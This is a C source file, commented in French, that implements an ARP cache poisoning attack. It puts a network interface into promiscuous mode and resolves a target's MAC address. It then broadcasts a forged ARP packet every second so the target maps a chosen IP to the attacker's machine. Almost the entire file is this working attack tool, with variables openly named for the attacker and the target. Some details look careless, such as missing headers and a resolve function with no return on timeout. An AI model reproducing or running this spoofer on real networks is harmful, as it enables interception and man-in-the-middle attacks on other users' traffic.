#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <net/if.h>

#define MAC_BROADCAST	"\xff\xff\xff\xff\xff\xff"
#define ARP_REQUEST	1
#define ARP_REPLY	2

//Copie l'adresse MAC pointée par "from" a l'adresse pointée par "to"
#define MAC_SET(to, from) \
	*((unsigned long *)(to))=*((unsigned long *)(from)); \
	*((unsigned short *)((char *)(to)+4))=*((unsigned short *)((char *)(from)+4));

//Compare les deux adresses MAC
#define MAC_CMP(a1, a2) \
	((*((unsigned long *)(a1))==*((unsigned long *)(a2))) && \
	(*((unsigned short *)((char *)(a1)+4))==*((unsigned short *)((char *)(a2)+4))))

//Structure ARP
struct struct_arp_head
{
	unsigned short physaddr_id;
	unsigned short proto_id;
	unsigned char physaddr_len;
	unsigned char protoaddr_len;
	unsigned short code;
};

//Convertit un short pour un système Big Endian
#define be(a) \
	((((unsigned short)(a))<<8)&0xffff) + (((a)>>8)&0xff)

int sock;
struct ifreq ifr;
char mac_attaquant[6];

int init_snoop_socket(char *device)
{
	int fd;
	struct sockaddr_ll sll;

	fd=socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));

	memset(&ifr, 0, sizeof(struct ifreq));

	strcpy(ifr.ifr_name, device);

	ioctl(fd, SIOCGIFINDEX, &ifr);
	
	memset(&sll, 0, sizeof(struct sockaddr_ll));
	sll.sll_family=PF_PACKET;
	sll.sll_ifindex=ifr.ifr_ifindex;
	sll.sll_protocol=htons(ETH_P_ALL);

	bind(fd, (struct sockaddr *)&sll, sizeof(struct sockaddr_ll));
	ioctl(fd, SIOCGIFFLAGS, &ifr);
	ifr.ifr_flags|=IFF_PROMISC;
	ioctl(fd, SIOCSIFFLAGS, &ifr);
	return fd;
}

int interface_mac_addr(int fd, char *buffer)
{
	ioctl(fd, SIOCGIFHWADDR, &ifr);

	memcpy(buffer, ifr.ifr_hwaddr.sa_data, 6);
	return 0;
}

unsigned long interface_ip_addr(int fd)
{
return *((unsigned long *)(ifr.ifr_addr.sa_data+2));
}

//Construit une trame ARP
int arp_build(char *buf,unsigned short code,unsigned char *mac_src,unsigned char *mac_dst,unsigned long ip_src,unsigned long ip_dst)

{
	int taille_paquet=0;
	struct ethhdr *eth;
	struct struct_arp_head *arp;

	eth=(struct ethhdr *)buf;
	MAC_SET(eth->h_dest, mac_dst);//MAC destination
	MAC_SET(eth->h_source, mac_src);//MAC source
	eth->h_proto=be(ETH_P_ARP);//ARP
	arp=(struct struct_arp_head *)(buf+14);
	arp->physaddr_id=be(0x01);//id @physique
	arp->proto_id=be(ETH_P_IP);//id protocole
	arp->physaddr_len=6;//longueur @physique
	arp->protoaddr_len=4;//longueur @logique
	arp->code=be(code);//ARP opcode
	MAC_SET(buf+22, eth->h_source);//adresse emetteur
	*((unsigned long *)(buf+28))=ip_src;//@logique emetteur
	MAC_SET(buf+32, eth->h_dest);//@physique destinataire
	*((unsigned long *)(buf+38))=ip_dst;//@logique destinataire

	//Bourrage avec des 0 pour atteindre 64 octects
	taille_paquet=42;
	for(taille_paquet=42; taille_paquet<64; taille_paquet++)
		buf[taille_paquet]=0x00;

	return taille_paquet;
}

//Resolution ARP, trouve l'adresse MAC associée à l'adresse IP ip_addr
int arp_resolve(unsigned long ip_addr, char *mac_addr)
{
	int r;
	char buffer[1600];
	struct ethhdr *eth;
	struct struct_arp_head *arp;
	long time_limit;

	r=arp_build(buffer, ARP_REQUEST, mac_attaquant, MAC_BROADCAST, interface_ip_addr(sock), ip_addr);

	send(sock, buffer, r, 0);

	time_limit=time(NULL)+5;

	while (time(NULL)<time_limit)
	{
		r=read(sock, buffer, 1600);

		eth=(struct ethhdr *)buffer;

		if (eth->h_proto==be(ETH_P_ARP))
		{
			arp=(struct struct_arp_head *)(buffer+ETH_HLEN);
			if (MAC_CMP(buffer, mac_attaquant) && arp->code==be(ARP_REPLY))
			{
				//verifier que la reponse ARP provient bien
				//de la machine cible
				if (*((unsigned long *)(buffer+28))==ip_addr)
				{
					//Sauvegarde de l'adresse MAC de notre cible
					MAC_SET(mac_addr, buffer+6);
					return 0;
				}
			}
		}
	}
}

int main(int argc, char **argv)
{
	int i, taille_paquet;
	char buffer[128];
	char mac_cible[6];
	unsigned long ip_attaquant;
	unsigned long ip_cible;

	if (argc!=3)
		return -1;
	sock=init_snoop_socket("eth0");
	
	interface_mac_addr(sock, mac_attaquant);
	ip_cible=inet_addr(argv[1]);
	ip_attaquant=inet_addr(argv[2]);
	
	arp_resolve(ip_cible, mac_cible);

	taille_paquet=arp_build(buffer, ARP_REQUEST, mac_attaquant, mac_cible, ip_attaquant, ip_cible);
	
	while(1)	//envoi la requete toutes les secondes
	{
		send(sock, buffer, taille_paquet, 0);		
		sleep(1);
	}
}
